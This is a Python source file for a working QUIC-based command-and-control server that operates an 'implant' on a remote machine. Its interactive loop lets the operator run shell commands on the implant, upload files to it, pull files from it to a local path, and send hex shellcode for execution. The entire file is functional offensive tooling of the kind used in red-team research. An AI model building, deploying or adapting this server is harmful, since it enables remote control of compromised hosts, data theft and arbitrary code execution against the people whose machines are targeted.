import asyncio
import logging
import os
import sys
from aioquic.asyncio import serve, QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import StreamDataReceived, ConnectionTerminated

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

current_client = None

# Download states
_DL_IDLE      = "idle"
_DL_WAIT_SIZE = "wait_size"   # expecting filesize int from implant
_DL_RECV_DATA = "recv_data"   # receiving raw binary


class C2ServerProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.command_stream_id = None
        self.output_buffer     = ""

        # Upload state
        self._upload_ack       = False   # True once implant says Ready

        # Download state (mirrors blog recv logic)
        self._dl_state         = _DL_IDLE
        self._dl_filesize      = 0
        self._dl_received      = 0
        self._dl_save_path     = None
        self._dl_file          = None
        self._dl_buf           = b""     # small buffer to handle split size packet

    def connection_made(self, transport):
        global current_client
        super().connection_made(transport)
        current_client = self
        logger.info("[C2] Implant connected!")

    def connection_lost(self, exc):
        global current_client
        super().connection_lost(exc)
        current_client = None
        logger.info("[C2] Implant disconnected.")

    def quic_event_received(self, event):
        if not isinstance(event, StreamDataReceived):
            if isinstance(event, ConnectionTerminated):
                logger.info(f"[C2] Connection terminated: {event.reason_phrase}")
            return

        raw = event.data

        if self.command_stream_id is None:
            self.command_stream_id = event.stream_id
            logger.info(f"[C2] Command stream established: {event.stream_id}")
            return

        # ── Download: waiting for filesize int ───────────────────────────────
        if self._dl_state == _DL_WAIT_SIZE:
            # Implant sends filesize as a plain string before binary data
            # Buffer in case it arrives split with initial data bytes
            self._dl_buf += raw
            try:
                # filesize will be the first line
                newline = self._dl_buf.find(b"\n") 
                if newline == -1:
                    # Try treating the whole thing as the size (no newline on Windows)
                    size_str = self._dl_buf.decode('utf-8', errors='ignore').strip()
                else:
                    size_str = self._dl_buf[:newline].decode('utf-8', errors='ignore').strip()
                    leftover = self._dl_buf[newline+1:]
                    self._dl_buf = leftover

                if size_str.startswith("ERROR:"):
                    logger.error(f"[C2] Implant reported: {size_str}")
                    self._dl_reset()
                    self.output_buffer = size_str
                    return

                self._dl_filesize = int(size_str)
                self._dl_state    = _DL_RECV_DATA
                self._dl_file     = open(self._dl_save_path, 'wb')
                logger.info(f"[C2] Receiving {self._dl_filesize} bytes -> {self._dl_save_path}")

                # Write any bytes that came in with the size packet
                if self._dl_buf:
                    self._write_dl_chunk(self._dl_buf)
                    self._dl_buf = b""

            except ValueError:
                # Not a full size yet, keep buffering
                pass
            return

        # ── Download: receiving raw binary data ───────────────────────────────
        if self._dl_state == _DL_RECV_DATA:
            self._write_dl_chunk(raw)
            return

        # ── Normal text output from implant ───────────────────────────────────
        text = raw.decode('utf-8', errors='ignore').strip()

        if not text or text == "READY":
            return

        # Upload ready ack
        if "***Ready for upload***" in text:
            self._upload_ack = True
            return

        # Upload complete ack
        if "File successfully uploaded!" in text:
            self.output_buffer = "[C2] " + text
            return

        self.output_buffer += text

    def _write_dl_chunk(self, data: bytes):
        remaining = self._dl_filesize - self._dl_received
        chunk     = data[:remaining]
        self._dl_file.write(chunk)
        self._dl_received += len(chunk)

        pct = int((self._dl_received / self._dl_filesize) * 100) if self._dl_filesize else 100
        print(f"\r[C2] Downloading {os.path.basename(self._dl_save_path)}: {pct}%  ",
              end="", flush=True)

        if self._dl_received >= self._dl_filesize:
            self._dl_file.close()
            print()  # newline after progress
            logger.info(f"[C2] Download complete: {self._dl_save_path} "
                        f"({self._dl_received} bytes)")
            self.output_buffer = f"DOWNLOAD_DONE|{self._dl_save_path}|{self._dl_received}"
            self._dl_reset()

    def _dl_reset(self):
        self._dl_state    = _DL_IDLE
        self._dl_filesize = 0
        self._dl_received = 0
        self._dl_save_path = None
        self._dl_file     = None
        self._dl_buf      = b""

    def send_command(self, cmd: str):
        if self.command_stream_id is None:
            logger.warning("[C2] No command stream yet.")
            return False
        self.output_buffer = ""
        self._quic.send_stream_data(
            self.command_stream_id, (cmd + "\n").encode(), end_stream=False)
        self.transmit()
        return True

    def send_raw(self, data: bytes):
        if self.command_stream_id is None:
            return False
        self._quic.send_stream_data(self.command_stream_id, data, end_stream=False)
        self.transmit()
        return True

    def get_output(self):
        out = self.output_buffer.strip()
        self.output_buffer = ""
        return out


# ── file transfer helpers ────────────────────────────────────────────────────

async def handle_upload(client: C2ServerProtocol, local_path: str, remote_path: str):
 
    if not os.path.isfile(local_path):
        logger.error(f"[C2] Local file not found: {local_path}")
        return

    filename = os.path.basename(remote_path)
    filesize = os.path.getsize(local_path)

    # Send header: ":upload:|<filename>|<filesize>"
    client._upload_ack = False
    client.send_command(f":upload:|{filename}|{filesize}")

    # Wait for implant ready ack
    for _ in range(20):
        await asyncio.sleep(0.3)
        if client._upload_ack:
            break
    else:
        logger.error("[C2] Implant never acknowledged upload. Aborting.")
        return

    logger.info(f"[C2] Sending {filesize} bytes...")

    # Stream raw binary in 4096-byte chunks with progress bar
    if HAS_TQDM:
        pbar = tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}")

    with open(local_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            client.send_raw(chunk)
            if HAS_TQDM:
                pbar.update(len(chunk))
            await asyncio.sleep(0)  # yield so QUIC can flush

    if HAS_TQDM:
        pbar.close()

    # Wait for implant completion ack
    for _ in range(30):
        await asyncio.sleep(0.3)
        out = client.get_output()
        if out:
            print(f"\n{out}\n")
            return
    logger.warning("[C2] No completion ack from implant after upload.")


async def handle_download(client: C2ServerProtocol, remote_path: str, local_save: str):

    client._dl_save_path = local_save
    client._dl_state     = _DL_WAIT_SIZE
    client._dl_buf       = b""
    client.output_buffer = ""

    # Send download request: "~download~|<filepath>"
    client.send_command(f"~download~|{remote_path}")

    # Poll until download completes (up to 120 s for large files)
    for _ in range(400):
        await asyncio.sleep(0.3)
        out = client.get_output()
        if not out:
            continue

        if out.startswith("DOWNLOAD_DONE|"):
            parts = out.split("|")
            print(f"\n[+] File successfully downloaded! Saved to {parts[1]} ({parts[2]} bytes)\n")
            return
        elif out.startswith("ERROR:"):
            print(f"\n[C2] {out}\n")
            client._dl_reset()
            return
        else:
            client.output_buffer = out  # still coming, put back

    logger.warning("[C2] Download timed out.")
    client._dl_reset()


# ── main loop ────────────────────────────────────────────────────────────────

async def read_input():
    return await asyncio.get_event_loop().run_in_executor(None, sys.stdin.readline)


async def run_server(host="127.0.0.1", port=4433):
    global current_client

    cert_file, key_file = "cert.pem", "key.pem"
    if not os.path.exists(cert_file) or not os.path.exists(key_file):
        logger.error("Certificate files missing! Generate with:")
        logger.error("  openssl req -x509 -newkey rsa:2048 -keyout key.pem "
                     "-out cert.pem -days 365 -nodes -subj '/CN=localhost'")
        return

    config = QuicConfiguration(is_client=False, alpn_protocols=["g3tsyst3m"])
    config.load_cert_chain(cert_file, key_file)
    config.max_idle_timeout = 600000

    logger.info(f"QUIC C2 listening on {host}:{port}")
    if not HAS_TQDM:
        logger.warning("tqdm not installed — upload progress bar disabled. pip install tqdm")

    server = await serve(host, port, configuration=config,
                         create_protocol=C2ServerProtocol)
    try:
        print("[C2] Command> ", end="", flush=True)
        while True:
            cmd = (await read_input()).strip()

            if not cmd:
                print("[C2] Command> ", end="", flush=True)
                continue

            if cmd.lower() == "exit":
                break

            if cmd.lower() in ("help", "?"):
                print("""
  <shell cmd>                    Run a shell command on the implant
  cd <path>                      Change implant working directory
  send <local> <remote>          Upload file to implant   (raw binary, tqdm progress)
  recv <remote> <local>          Download file from implant (raw binary)
  send_shellcode <hex>           Execute shellcode on the implant
  exit                           Shut down the C2
""")
                print("[C2] Command> ", end="", flush=True)
                continue

            if current_client is None:
                logger.warning("[C2] No implant connected yet.")
                print("[C2] Command> ", end="", flush=True)
                continue

            # ── send (upload) ────────────────────────────────────────────────
            if cmd.startswith("send "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    logger.warning("[C2] Usage: send <local_path> <remote_dest_name>")
                else:
                    await handle_upload(current_client, parts[1], parts[2])

            # ── recv (download) ──────────────────────────────────────────────
            elif cmd.startswith("recv "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    logger.warning("[C2] Usage: recv <remote_path> <local_save_path>")
                else:
                    await handle_download(current_client, parts[1], parts[2])

            # ── shellcode ────────────────────────────────────────────────────
            elif cmd.startswith("send_shellcode "):
                parts = cmd.split(" ", 1)
                if len(parts) < 2:
                    logger.warning("[C2] Usage: send_shellcode <hex_shellcode>")
                else:
                    current_client.send_command(f"exec_shellcode {parts[1].strip()}")
                    await asyncio.sleep(1.0)
                    out = current_client.get_output()
                    if out:
                        print(f"\n{out}\n")

            # ── regular shell command ────────────────────────────────────────
            else:
                if current_client.send_command(cmd):
                    await asyncio.sleep(0.5)
                    out = current_client.get_output()
                    if out:
                        print(f"\n{out}\n")

            print("[C2] Command> ", end="", flush=True)

    except KeyboardInterrupt:
        logger.info("Shutting down C2...")
    finally:
        server.close()


if __name__ == "__main__":
    asyncio.run(run_server())